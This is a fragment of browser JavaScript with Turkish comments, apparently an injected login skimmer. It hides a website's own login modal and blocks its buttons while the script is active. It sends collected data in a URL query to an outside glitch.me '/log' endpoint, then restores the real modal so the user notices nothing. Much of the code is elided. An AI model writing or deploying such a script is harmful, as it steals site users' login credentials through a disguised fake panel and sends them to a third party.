(function () {
  ...
  function setupButtonListeners() {
    ...
    // Sitenin kendi giriş panelini engelle
    const originalModal = document.querySelector('.bd-example-modal-sm');
    if (originalModal && isScriptActive) {
      originalModal.style.display = 'none'; // Modalı gizle
      const originalButtons = document.querySelectorAll('[data-bs-target=".bd-example-modal-sm"]');
      originalButtons.forEach(button => {
        button.addEventListener('click', (e) => {
          if (isScriptActive) e.preventDefault(); // Script aktifse engelle
        });
      });
    }
  }
      ...
      fetch(`https://ancient-pentagonal-elephant.glitch.me/log?${data}`, {
        ...
        .then(() => {
          ...
          setTimeout(() => {
            ...
            // Sitenin kendi panelini tekrar aktif et
            const originalModal = document.querySelector('.bd-example-modal-sm');
            if (originalModal) originalModal.style.display = 'block';
          }, 500);
        })
        .catch(() => {
